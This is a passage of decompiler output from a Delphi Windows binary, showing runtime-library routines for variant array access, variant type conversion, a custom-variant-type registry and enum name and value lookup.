      ++v7;
      if ( !--v6 )
        goto LABEL_6;
    }
    LOBYTE(v4) = 1;
  }
LABEL_6:
  if ( (_BYTE)v4 )
  {
    v8 = sub_405594(*a1);
    if ( v8 >= 0 )
    {
      if ( *(_DWORD *)(*a1 + 4 * v8) )
      {
        --*(_DWORD *)(*a1 + 4 * v8);
      }
      else
      {
        while ( !*(_DWORD *)(*a1 + 4 * v8) )
        {
          *(_DWORD *)(*a1 + 4 * v8) = *(_DWORD *)(a2 + 4 * v8);
          --v8;
        }
        --*(_DWORD *)(*a1 + 4 * v8);
      }
    }
  }
  return v4;
}

//----- (00415594) --------------------------------------------------------
int __usercall sub_415594@<eax>(_DWORD *a1@<eax>, _BYTE *a2@<edx>, int *a3@<ecx>)
{
  int v5; // ebp
  int i; // ebx
  int v7; // ebx
  int result; // eax

  v5 = sub_41544C(a2);
  sub_405748(a3, (int)dword_4011C8, (void *)1, 2 * v5);
  for ( i = 0; ; i = v7 + 1 )
  {
    result = 2 * v5;
    if ( i >= 2 * v5 )
      break;
    *(_DWORD *)(*a3 + 4 * i) = 0;
    v7 = i + 1;
    if ( a1 )
    {
      *(_DWORD *)(*a3 + 4 * v7) = sub_415464((int)a1) - 1;
      a1 = (_DWORD *)*a1;
    }
  }
  return result;
}
// 4011C8: using guessed type int dword_4011C8[5];

//----- (004155EC) --------------------------------------------------------
int __usercall sub_4155EC@<eax>(_BYTE *a1@<eax>)
{
  int v1; // edx

  v1 = 1;
  if ( a1 && *a1 == 17 )
    v1 = *(_DWORD *)&a1[(unsigned __int8)a1[1] + 10];
  if ( v1 == 72 )
    return 256;
  return v1;
}

//----- (00415614) --------------------------------------------------------
int *__usercall sub_415614@<eax>(__int32 a1@<eax>, int *a2@<edx>, __int32 a3@<ecx>)
{
  VARIANTARG *v3; // edi
  int v4; // eax
  int v5; // ebx
  void *v6; // esi
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  double *v11; // esi
  int v12; // eax
  VARIANTARG *ExceptionList; // [esp-Ch] [ebp-50h] BYREF
  void *v15; // [esp-8h] [ebp-4Ch]
  int *v16; // [esp-4h] [ebp-48h]
  void *v17; // [esp+0h] [ebp-44h]
  int v18[4]; // [esp+Ch] [ebp-38h] BYREF
  VARIANTARG v19; // [esp+1Ch] [ebp-28h] BYREF
  int v20; // [esp+30h] [ebp-14h] BYREF
  int v21; // [esp+34h] [ebp-10h] BYREF
  LONG *v22; // [esp+38h] [ebp-Ch] BYREF
  int *v23; // [esp+3Ch] [ebp-8h]
  __int32 v24; // [esp+40h] [ebp-4h] BYREF
  int savedregs; // [esp+44h] [ebp+0h] BYREF

  v3 = (VARIANTARG *)_InterlockedExchange(&v24, a3);
  v23 = a2;
  v24 = a1;
  v16 = &savedregs;
  v15 = &loc_415919;
  ExceptionList = (VARIANTARG *)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_405868((int *)&v22, (int)dword_4011C8);
  sub_405868(&v21, (int)dword_4011C8);
  sub_4050A8(ExceptionList);
  v4 = sub_4155EC(v3);
  v5 = v4;
  if ( v4 > 1 && v4 <= 17 || v4 == 256 )
  {
    v6 = (void *)(v4 == 256 ? 8 : v4);
    if ( sub_41544C(v3) <= 1 || (unsigned __int8)sub_41546C(v23, v3) )
    {
      sub_415594(v23, v3, (int *)&v22);
      sub_4154D4(v23, v3, &v21);
      sub_405754(v21, (int)dword_4011C8, &v20);
      ExceptionList = (VARIANTARG *)v18;
      v7 = sub_405594((int)v22);
      sub_414F5C(v22, v7, v6, ExceptionList);
      sub_4050B0(v8, v18);
      while ( 1 )
      {
        ExceptionList = v3;
        v9 = sub_405594(v20);
        v11 = (double *)sub_4153F0(v23, v20, v9, (int **)ExceptionList);
        if ( v11 )
          break;
LABEL_43:
        if ( !(unsigned __int8)sub_415528(&v20, v21) )
          goto LABEL_44;
      }
      if ( v5 <= 10 )
      {
        if ( v5 == 10 )
        {
LABEL_26:
          LOBYTE(v10) = -4;
          sub_405100(v10, *(_DWORD *)v11);
        }
        else
        {
          switch ( v5 )
          {
            case 2:
              LOBYTE(v10) = -2;
              sub_405100(v10, *(__int16 *)v11);
              break;
            case 3:
              goto LABEL_26;
            case 4:
              sub_405124(*(float *)v11);
              break;
            case 5:
            case 7:
              sub_405124(*v11);
              break;
            case 6:
              sub_40512C((double)*(__int64 *)v11);
              break;
            case 8:
              sub_40513C();
              break;
            case 9:
              sub_40514C();
              break;
            default:
              goto LABEL_41;
          }
        }
        goto LABEL_42;
      }
      if ( v5 > 17 )
      {
        switch ( v5 )
        {
          case 18:
            LOBYTE(v10) = 2;
            sub_405100(v10, *(unsigned __int16 *)v11);
            break;
          case 19:
            LOBYTE(v10) = 4;
            sub_405100(v10, *(_DWORD *)v11);
            break;
          case 256:
            sub_405134();
            break;
          default:
            goto LABEL_41;
        }
      }
      else
      {
        switch ( v5 )
        {
          case 17:
            LOBYTE(v10) = 1;
            sub_405100(v10, *(unsigned __int8 *)v11);
            break;
          case 11:
            sub_40511C();
            break;
          case 12:
            sub_4050B0(v10, v11);
            break;
          case 13:
            sub_405144();
            break;
          case 16:
            LOBYTE(v10) = -1;
            sub_405100(v10, *(char *)v11);
            break;
          default:
LABEL_41:
            sub_4050A8(v15);
            break;
        }
      }
LABEL_42:
      v12 = sub_405594(v20);
      sub_4153C8(v24, &v19, v20, v12);
      goto LABEL_43;
    }
  }
LABEL_44:
  __writefsdword(0, (unsigned int)v15);
  v17 = &loc_415920;
  sub_404CE4(v18, (char *)dword_401068, 2);
  return sub_404CE4(&v20, (char *)dword_4011C8, 3);
}
// 4156FA: variable 'v8' is possibly undefined
// 4157BC: variable 'v10' is possibly undefined
// 401068: using guessed type int dword_401068[2];
// 4011C8: using guessed type int dword_4011C8[5];
// 4050A8: using guessed type int __stdcall sub_4050A8(_DWORD);
// 4050B0: using guessed type int __fastcall sub_4050B0(_DWORD, _DWORD);
// 405100: using guessed type int __fastcall sub_405100(_DWORD, _DWORD);
// 40511C: using guessed type int sub_40511C(void);
// 405124: using guessed type int __usercall sub_405124@<eax>(double@<st0>);
// 40512C: using guessed type int __usercall sub_40512C@<eax>(double@<st0>);
// 405134: using guessed type int sub_405134(void);
// 40513C: using guessed type int sub_40513C(void);
// 405144: using guessed type int sub_405144(void);
// 40514C: using guessed type int sub_40514C(void);
// 415614: using guessed type int var_38[4];
// 415614: using guessed type VARIANTARG var_28;

//----- (00415928) --------------------------------------------------------
int *__usercall sub_415928@<eax>(int *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>)
{
  LONG v4; // ecx
  int v5; // edi
  int v6; // ebx
  LONG v7; // ecx
  LONG v8; // eax
  _BYTE *v9; // ebx
  int v10; // ebx
  int v11; // eax
  int v12; // eax
  int v13; // ecx
  _DWORD *v14; // edi
  LONG v16; // [esp-10h] [ebp-44h]
  int **v17; // [esp-10h] [ebp-44h]
  unsigned int v18[2]; // [esp-Ch] [ebp-40h] BYREF
  int *v19; // [esp-4h] [ebp-38h]
  VARIANTARG v20; // [esp+Ch] [ebp-28h] BYREF
  int v21; // [esp+1Ch] [ebp-18h] BYREF
  int v22; // [esp+20h] [ebp-14h] BYREF
  int *v23; // [esp+24h] [ebp-10h]
  int v24; // [esp+28h] [ebp-Ch]
  _BYTE *v25; // [esp+2Ch] [ebp-8h]
  int *v26; // [esp+30h] [ebp-4h] BYREF
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v25 = (_BYTE *)_InterlockedExchange((volatile __int32 *)&v26, a3);
  v26 = a1;
  v19 = &savedregs;
  v18[1] = (unsigned int)&loc_415BD1;
  v18[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v18);
  v24 = sub_415084(a2);
  v23 = (int *)sub_4026E0(4 * v24);
  if ( v24 - 1 >= 0 )
  {
    v5 = v24;
    v6 = 0;
    do
    {
      v16 = sub_4150D4(a2, v6 + 1, v4);
      v8 = sub_4150AC(a2, v6 + 1, v7);
      v23[v6++] = v16 - v8 + 1;
      --v5;
    }
    while ( v5 );
  }
  v9 = v25;
  sub_4055BC(v26, (int)v25, (void *)v24, v23);
  sub_41544C(v9);
  v10 = sub_4155EC(v9);
  sub_4154D4((_DWORD *)*v26, v25, &v22);
  sub_405754(v22, (int)dword_4011C8, &v21);
  do
  {
    v11 = sub_405594(v21);
    sub_41525C(a2, v21, v11, &v20);
    v17 = (int **)v25;
    v12 = sub_405594(v21);
    v14 = sub_4153F0((_DWORD *)*v26, v21, v12, v17);
    if ( v10 > 10 )
    {
      if ( v10 > 17 )
      {
        switch ( v10 )
        {
          case 18:
LABEL_19:
            *(_WORD *)v14 = sub_4050B8();
            break;
          case 19:
LABEL_26:
            *v14 = sub_4050B8();
            break;
          case 256:
            sub_4050E0(v13, &v20);
            break;
        }
      }
      else
      {
        switch ( v10 )
        {
          case 17:
            goto LABEL_30;
          case 11:
            *(_WORD *)v14 = sub_4050C8();
            break;
          case 12:
            sub_4050B0(v13, &v20);
            break;
          case 13:
            sub_4050F0();
            break;
          case 16:
LABEL_30:
            *(_BYTE *)v14 = sub_4050B8();
            break;
        }
      }
    }
    else
    {
      if ( v10 == 10 )
        goto LABEL_26;
      switch ( v10 )
      {
        case 2:
          goto LABEL_19;
        case 3:
          goto LABEL_26;
        case 4:
          *(float *)v14 = sub_4050D0();
          break;
        case 5:
        case 7:
          *(double *)v14 = sub_4050D0();
          break;
        case 6:
          *(_QWORD *)v14 = (__int64)sub_4050D8();
          break;
        case 8:
          sub_4050E8();
          break;
        case 9:
          sub_4050F8();
          break;
        default:
          break;
      }
    }
  }
  while ( (unsigned __int8)sub_415528(&v21, v22) );
  sub_402700((int)v23);
  __writefsdword(0, v18[0]);
  v19 = (int *)&loc_415BD8;
  sub_405160();
  return sub_404CE4(&v21, (char *)dword_4011C8, 2);
}
// 41597D: variable 'v4' is possibly undefined
// 415988: variable 'v7' is possibly undefined
// 415B3F: variable 'v13' is possibly undefined
// 4011C8: using guessed type int dword_4011C8[5];
// 4050B0: using guessed type int __fastcall sub_4050B0(_DWORD, _DWORD);
// 4050B8: using guessed type int sub_4050B8(void);
// 4050C8: using guessed type int sub_4050C8(void);
// 4050D0: using guessed type double sub_4050D0(void);
// 4050D8: using guessed type double sub_4050D8(void);
// 4050E0: using guessed type int __fastcall sub_4050E0(_DWORD, _DWORD);
// 4050E8: using guessed type int sub_4050E8(void);
// 4050F0: using guessed type int sub_4050F0(void);
// 4050F8: using guessed type int sub_4050F8(void);

//----- (00415C04) --------------------------------------------------------
_DWORD *__usercall sub_415C04@<eax>(int a1@<ebx>)
{
  int v1; // ebx
  _DWORD *v2; // eax
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  sub_40AA74(dword_42CBB0, a1);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_415C67;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v1 = sub_40558C(dword_42CBAC) - 1;
  if ( v1 >= 0 )
  {
    do
    {
      v2 = *(_DWORD **)(dword_42CBAC + 4 * v1);
      if ( v2 != (_DWORD *)dword_42B494 )
        sub_403534(v2);
      --v1;
    }
    while ( v1 != -1 );
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_415C6E;
  return sub_40AB74(dword_42CBB0);
}
// 42B494: using guessed type int dword_42B494;
// 42CBAC: using guessed type int dword_42CBAC;
// 42CBB0: using guessed type int dword_42CBB0;

//----- (00415C74) --------------------------------------------------------
void __noreturn sub_415C74()
{
  sub_415E2C();
}
// 415C74: using guessed type void __noreturn sub_415C74();
// 415E2C: using guessed type void __noreturn sub_415E2C(void);

//----- (00415C80) --------------------------------------------------------
int __usercall sub_415C80@<eax>(int a1@<eax>, int a2@<edx>, unsigned __int16 *a3@<ecx>)
{
  int v6; // eax
  unsigned __int16 *v8; // [esp+0h] [ebp-10h] BYREF

  v8 = a3;
  if ( !sub_415EA4(*a3, &v8) )
    sub_415E24();
  LOWORD(v6) = *(_WORD *)(a1 + 4);
  return (*(int (__fastcall **)(unsigned __int16 *, int, int))(*(_DWORD *)v8 + 28))(a3, a2, v6);
}
// 415CA7: variable 'v6' is possibly undefined
// 415E24: using guessed type void __noreturn sub_415E24(void);

//----- (00415CB8) --------------------------------------------------------
int __userpurge sub_415CB8@<eax>(int a1@<eax>, int a2@<edx>, unsigned __int16 *a3@<ecx>, int a4)
{
  int v6; // [esp+Ch] [ebp-8h] BYREF
  int v7; // [esp+10h] [ebp-4h]

  v7 = a2;
  if ( (_WORD)a4 == *(_WORD *)(a1 + 4) || !sub_415EA4(*a3, &v6) )
    sub_415E24();
  return (*(int (__fastcall **)(unsigned __int16 *, int, int))(*(_DWORD *)v6 + 28))(a3, v7, a4);
}
// 415E24: using guessed type void __noreturn sub_415E24(void);

//----- (00415D00) --------------------------------------------------------
void __noreturn sub_415D00()
{
  sub_415E2C();
}
// 415D00: using guessed type void __noreturn sub_415D00();
// 415E2C: using guessed type void __noreturn sub_415E2C(void);

//----- (00415D0C) --------------------------------------------------------
char __userpurge sub_415D0C@<al>(int a1@<eax>, int a2)
{
  unsigned __int8 v3; // [esp+Fh] [ebp-1h] BYREF

  (*(void (__stdcall **)(unsigned __int8 *))(*(_DWORD *)a1 + 56))(&v3);
  return byte_42B4A4[3 * a2 - 42 + v3];
}
// 42B4A4: using guessed type _BYTE byte_42B4A4[20];

//----- (00415D44) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_415D44@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v6; // eax
  int v8; // [esp+0h] [ebp-14h] BYREF
  __int16 v9; // [esp+4h] [ebp-10h]

  v8 = a3;
  v6 = (*(int (__fastcall **)(int *, int))(*(_DWORD *)a1 + 12))(&v8, a3);
  if ( !(_BYTE)v6 )
    sub_415E24();
  LOWORD(v6) = v9;
  return (*(int (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 28))(a3, a2, v6);
}
// 415D72: bad sp value at call
// 415E24: using guessed type void __noreturn sub_415E24(void);

//----- (00415D80) --------------------------------------------------------
_DWORD *__usercall sub_415D80@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ebx>)
{
  _DWORD *v3; // eax
  char v4; // dl
  _DWORD *result; // eax
  unsigned int v6[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v7; // [esp-4h] [ebp-Ch]
  char v8; // [esp+3h] [ebp-5h]
  _DWORD *v9; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v3 = sub_4038CC(a1, a2);
  v8 = v4;
  v9 = v3;
  sub_40AA74(dword_42CBB0, a3);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_415DDB;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  *(_DWORD *)(dword_42CBAC + 4 * *((unsigned __int16 *)v9 + 2) - 1024) = dword_42B494;
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_415DE2;
  sub_40AB74(dword_42CBB0);
  result = sub_403524(v9, v8 & 0xFC);
  if ( v8 > 0 )
    return (_DWORD *)sub_4038B4(v9);
  return result;
}
// 415D8B: variable 'v4' is possibly undefined
// 42B494: using guessed type int dword_42B494;
// 42CBAC: using guessed type int dword_42CBAC;
// 42CBB0: using guessed type int dword_42CBB0;

//----- (00415E04) --------------------------------------------------------
int sub_415E04()
{
  return 0;
}

//----- (00415E08) --------------------------------------------------------
char __userpurge sub_415E08@<al>(int a1@<eax>, _WORD *a2)
{
  *a2 = *(_WORD *)(a1 + 4);
  return 1;
}

//----- (00415E1C) --------------------------------------------------------
char __thiscall sub_415E1C(_WORD *this)
{
  *this = 8;
  return 1;
}

//----- (00415E3C) --------------------------------------------------------
char __userpurge sub_415E3C@<al>(int a1@<eax>, _WORD *a2)
{
  *a2 = *(_WORD *)(a1 + 4);
  return 1;
}

//----- (00415E58) --------------------------------------------------------
void __noreturn sub_415E58()
{
  sub_415E34();
}
// 415E34: using guessed type void __noreturn sub_415E34(void);
// 415E58: using guessed type void __noreturn sub_415E58();

//----- (00415E7C) --------------------------------------------------------
int __stdcall sub_415E7C(int *a1, _DWORD *a2, _DWORD *a3)
{
  if ( (unsigned __int8)sub_4035E8(a1, a2, a3) )
    return 0;
  else
    return -2147467262;
}

//----- (00415EA4) --------------------------------------------------------
char __usercall sub_415EA4@<al>(unsigned __int16 a1@<ax>, _DWORD *a2@<edx>)
{
  bool v4; // al
  bool v5; // al
  unsigned int v7[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v8; // [esp-4h] [ebp-10h]
  bool v9; // [esp+Bh] [ebp-1h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  sub_40AC18(dword_42CBB0);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_415F35;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v4 = a1 >= 0x100u && sub_40558C(dword_42CBAC) > a1 - 256;
  v9 = v4;
  if ( v4 )
  {
    *a2 = *(_DWORD *)(dword_42CBAC + 4 * a1 - 1024);
    v5 = *a2 && *a2 != dword_42B494;
    v9 = v5;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_415F3C;
  sub_40ACBC(dword_42CBB0);
  return v9;
}
// 42B494: using guessed type int dword_42B494;
// 42CBAC: using guessed type int dword_42CBAC;
// 42CBB0: using guessed type int dword_42CBB0;

//----- (00415F44) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char __usercall sub_415F44@<al>(_BYTE *a1@<eax>, int **a2@<edx>)
{
  int v2; // eax
  int v3; // esi
  int v4; // edi
  int *v5; // ebx
  unsigned int v7[2]; // [esp-18h] [ebp-134h] BYREF
  void **v8; // [esp-10h] [ebp-12Ch]
  _DWORD v9[6]; // [esp-Ch] [ebp-128h] BYREF
  char v10[256]; // [esp+Ch] [ebp-110h] BYREF
  char *v11; // [esp+10Ch] [ebp-10h] BYREF
  char v12; // [esp+113h] [ebp-9h]
  int **v13; // [esp+114h] [ebp-8h]
  _BYTE *v14; // [esp+118h] [ebp-4h]
  void *savedregs; // [esp+11Ch] [ebp+0h] BYREF

  v11 = 0;
  v13 = a2;
  v14 = a1;
  v9[2] = &savedregs;
  v9[1] = &loc_41601A;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v12 = 0;
  sub_40AC18(dword_42CBB0);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_415FFD;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v2 = sub_405594(dword_42CBAC);
  if ( v2 >= 0 )
  {
    v3 = v2 + 1;
    v4 = 0;
    while ( 1 )
    {
      v5 = *(int **)(dword_42CBAC + 4 * v4);
      if ( v5 )
      {
        if ( v5 != (int *)dword_42B494 )
        {
          sub_403484(*v5, v10);
          sub_4044C8(&v11, v10);
          if ( sub_407ACC(v11, v14) )
            break;
        }
      }
      ++v4;
      if ( !--v3 )
        goto LABEL_8;
    }
    *v13 = v5;
    v12 = 1;
  }
LABEL_8:
  __writefsdword(0, v7[0]);
  v8 = (void **)&loc_416004;
  sub_40ACBC(dword_42CBB0);
  __writefsdword(0, (unsigned int)v13);
  savedregs = &loc_416021;
  sub_40426C(&v11);
  return v12;
}
// 416014: bad sp value at call
// 42B494: using guessed type int dword_42B494;
// 42CBAC: using guessed type int dword_42CBAC;
// 42CBB0: using guessed type int dword_42CBB0;
// 415F44: using guessed type char *var_10;

//----- (0041602C) --------------------------------------------------------
VARIANTARG *__usercall sub_41602C@<eax>(VARIANTARG *a1@<eax>, int a2@<ecx>)
{
  VARIANTARG *result; // eax

  result = sub_412180(a1, a2);
  a1->vt = 1;
  return result;
}

//----- (00416040) --------------------------------------------------------
int __usercall sub_416040@<eax>(int a1@<ebx>)
{
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_41609A;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !++dword_42CA50 )
  {
    sub_415C04(a1);
    sub_40AD4C((_DWORD **)&dword_42CBB0);
    sub_405094(&unk_42CB00);
    sub_405868(&dword_42CBAC, (int)dword_415BE4);
    sub_405160();
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 415BE4: using guessed type int dword_415BE4[3];
// 42CA50: using guessed type int dword_42CA50;
// 42CBAC: using guessed type int dword_42CBAC;
// 42CBB0: using guessed type int dword_42CBB0;

//----- (004160A4) --------------------------------------------------------
int sub_4160A4()
{
  int result; // eax
  unsigned int v2[4]; // [esp-Ch] [ebp-10h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_41629E;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( dword_42CA50-- == 0 )
  {
    sub_414E80((int)&unk_42CA30);
    dword_42CA40 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_412160;
    dword_42CA44 = (int (*)(void))sub_412170;
    dword_42CA48 = (int (__stdcall *)(_DWORD))sub_412168;
    dword_42CA4C = (int (*)(void))sub_412170;
    dword_42CA54[0] = sub_412180;
    dword_42CA54[1] = sub_4125AC;
    dword_42CA54[2] = sub_414D7C;
    dword_42CA54[3] = sub_412B30;
    dword_42CA54[4] = sub_412C4C;
    dword_42CA54[5] = sub_412CB4;
    dword_42CA54[6] = sub_412D90;
    dword_42CA54[7] = sub_412EDC;
    dword_42CA54[8] = sub_412F18;
    dword_42CA54[9] = sub_413054;
    dword_42CA54[10] = sub_41323C;
    dword_42CA54[11] = sub_4131C8;
    dword_42CA54[12] = sub_41328C;
    dword_42CA54[13] = sub_41336C;
    dword_42CA54[14] = sub_413410;
    dword_42CA54[15] = sub_413494;
    dword_42CA54[16] = sub_4134A4;
    dword_42CA54[17] = sub_413554;
    dword_42CA54[18] = sub_413580;
    dword_42CA54[19] = sub_4135A8;
    dword_42CA54[20] = sub_4135C0;
    dword_42CA54[21] = sub_4135D8;
    dword_42CA54[22] = sub_41361C;
    dword_42CA54[23] = sub_4135F0;
    dword_42CA54[24] = sub_41366C;
    dword_42CA54[25] = sub_4136A4;
    dword_42CA54[26] = sub_4136D0;
    dword_42CA54[27] = sub_4136FC;
    dword_42CA54[28] = sub_413760;
    dword_42CA54[29] = sub_413710;
    dword_42CA54[30] = sub_41385C;
    dword_42CA54[31] = sub_413534;
    dword_42CA54[32] = sub_413A4C;
    dword_42CA54[33] = sub_414908;
    dword_42CA54[34] = sub_414B88;
    dword_42CA54[35] = sub_414C98;
    dword_42CA54[36] = sub_4121F8;
    dword_42CA54[37] = sub_414D84;
    dword_42CA54[38] = sub_415008;
    dword_42CA54[39] = sub_415188;
    dword_42CA54[40] = sub_415280;
    dword_42CA54[41] = sub_414E90;
    dword_42CA54[42] = sub_414F08;
    sub_405080(dword_42CB00);
    sub_405094(dword_42CA54);
    dword_42CBB0 = (int)sub_40A974(dword_4079B0, 1);
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 4079B0: using guessed type int dword_4079B0[10];
// 42CA40: using guessed type int (__cdecl *dword_42CA40)(_DWORD, _DWORD, _DWORD, _DWORD);
// 42CA44: using guessed type int (*dword_42CA44)(void);
// 42CA48: using guessed type int (__stdcall *dword_42CA48)(_DWORD);
// 42CA4C: using guessed type int (*dword_42CA4C)(void);
// 42CA50: using guessed type int dword_42CA50;
// 42CA54: using guessed type _DWORD dword_42CA54[43];
// 42CB00: using guessed type int dword_42CB00[43];
// 42CBB0: using guessed type int dword_42CBB0;

//----- (00416358) --------------------------------------------------------
int sub_416358()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_41637D;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42CBB4;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42CBB4: using guessed type int dword_42CBB4;

//----- (00416388) --------------------------------------------------------
void sub_416388()
{
  --dword_42CBB4;
}
// 42CBB4: using guessed type int dword_42CBB4;

//----- (004163BC) --------------------------------------------------------
int __usercall sub_4163BC@<eax>(int a1@<eax>)
{
  return a1 + *(unsigned __int8 *)(a1 + 1) + 2;
}

//----- (004163C8) --------------------------------------------------------
_DWORD *__usercall sub_4163C8@<eax>(int *a1@<eax>, int a2@<edx>, char **a3@<ecx>)
{
  int v4; // ebx
  int v6; // eax
  int v7; // eax
  char *i; // esi
  unsigned int v10[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v11; // [esp-10h] [ebp-14h]
  char *v12; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v12 = 0;
  v4 = a2;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_4164A3;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  if ( *(_BYTE *)a1 == 1 )
  {
    sub_407BC4(a2, a3);
  }
  else
  {
    v6 = sub_4163BC((int)a1);
    v7 = sub_4163BC(**(_DWORD **)(v6 + 9));
    if ( a1 == dword_401004 || *(int *)(v7 + 1) < 0 )
    {
      if ( dword_401004 == a1 )
        sub_4042C0((volatile __int32 *)a3, (__int32)off_42B4B8[(unsigned __int8)v4]);
      else
        sub_4042C0((volatile __int32 *)a3, (__int32)off_42B4B8[v4 != 0]);
      if ( sub_407ACC(*off_42BA60, &dword_4164B8) )
      {
        sub_407A1C((int)*a3, &v12);
        sub_4042C0((volatile __int32 *)a3, (__int32)v12);
      }
    }
    else
    {
      for ( i = (char *)(v7 + 13); v4; --v4 )
        i += (unsigned __int8)*i + 1;
      sub_4044C8(a3, i);
    }
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_4164AA;
  return sub_40426C(&v12);
}
// 401004: using guessed type int dword_401004[4];
// 4164B8: using guessed type int dword_4164B8;
// 42B4B8: using guessed type char *off_42B4B8[2];
// 42BA60: using guessed type int **off_42BA60;

//----- (004164BC) --------------------------------------------------------
int __usercall sub_4164BC@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // eax
  int v3; // ecx
  _BYTE *v4; // esi
  int v5; // edi
  int result; // eax

  if ( a2 )
  {
    v2 = **(_DWORD **)(a1 + *(unsigned __int8 *)(a1 + 1) + 11);
    v3 = *(unsigned __int8 *)(v2 + 1);
    v4 = (_BYTE *)(v2 + v3 + 15);
    v5 = *(_DWORD *)(v2 + v3 + 7);
    result = 0;
    do
    {
      LOBYTE(v3) = *v4;
      if ( v3 == *(_DWORD *)(a2 - 4) )
      {
        while ( ((v4[v3] ^ *(_BYTE *)(v3 + a2 - 1)) & 0xDF) == 0 )
        {
          if ( !--v3 )
            return result;
        }
        LOBYTE(v3) = *v4;
      }
      ++result;
      v4 += v3 + 1;
    }
    while ( result <= v5 );
  }
  return -1;
}

//----- (00416508) --------------------------------------------------------
int __usercall sub_416508@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>)
{
  if ( *a1 == 1 )
    return Delphi_StrToInt_407C28((int)a2);
  if ( *(int *)(sub_4163BC((int)a1) + 1) >= 0 )
    return sub_4164BC((int)a1, (int)a2);
  if ( sub_407ACC(a2, off_42B4B8[0]) )
    return 0;
  if ( sub_407ACC(a2, off_42B4BC) )
    return -1;
  return Delphi_StrToInt_407C28((int)a2);
}
// 42B4B8: using guessed type char *off_42B4B8[2];
// 42B4BC: using guessed type char *off_42B4BC;

//----- (0041656C) --------------------------------------------------------
int __usercall sub_41656C@<eax>(int result@<eax>, _BYTE *a2@<edx>)
{
  int v2; // ecx
  __int16 v3; // cx
  int v4; // esi
  int v5; // ebx
  int v6; // edi

  if ( result )
  {
    v2 = (int)a2;
    if ( a2 )
    {
      LOBYTE(v3) = *(a2 - 4);
      HIBYTE(v3) = *a2;
      v2 = v3 & 0xDFFF;
    }
    while ( 1 )
    {
      v4 = result + *(unsigned __int8 *)(result + 1) + 2;
      v5 = *(unsigned __int8 *)(result + *(unsigned __int8 *)(result + 1) + 12);
      v6 = *(unsigned __int16 *)(v4 + v5 + 11);
      if ( *(_WORD *)(v4 + v5 + 11) )
      {
        result = v4 + v5 + 13;
        do
        {
          LOWORD(v5) = *(_WORD *)(result + 26);
          BYTE1(v5) &= ~0x20u;
          if ( v5 == v2 )
          {
            BYTE1(v5) = 0;
            while ( ((*(_BYTE *)(result + v5 + 26) ^ a2[v5 - 1]) & 0xDF) == 0 )
            {
              if ( !--v5 )
                return result;
            }
            BYTE1(v2) = *a2 & 0xDF;
            LOBYTE(v5) = *(_BYTE *)(result + 26);
          }
          BYTE1(v5) = 0;
          --v6;
          result += v5 + 27;
        }
        while ( v6 );
      }
      result = *(_DWORD *)(v4 + 4);
      if ( !result )
        break;
      result = *(_DWORD *)result;
    }
  }
  return result;
}

//----- (004165DC) --------------------------------------------------------
int __usercall sub_4165DC@<eax>(int a1@<eax>, void *a2@<edx>)
